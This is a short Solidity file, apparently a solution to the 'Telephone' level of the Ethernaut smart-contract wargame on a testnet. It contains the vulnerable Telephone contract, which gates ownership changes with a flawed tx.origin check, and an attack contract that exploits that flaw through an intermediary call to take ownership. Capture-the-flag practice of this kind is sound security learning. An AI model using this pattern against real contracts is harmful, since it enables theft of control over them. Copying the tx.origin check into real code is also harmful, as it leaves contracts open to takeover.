// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
 * Used to solve level 4 (telephone) in Ethernaut. 
 * It was easier to deploy a contract through truffle than it was to connect through the web3
 * cli. It's a testnet. I get to be lazy.
 * Deploy this with a different wallet other than the instance's wallet.
*/
contract TelephoneAttack {
    constructor(address telephone, address instanceOwner) public {
        Telephone(telephone).changeOwner(instanceOwner);
    }
}

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
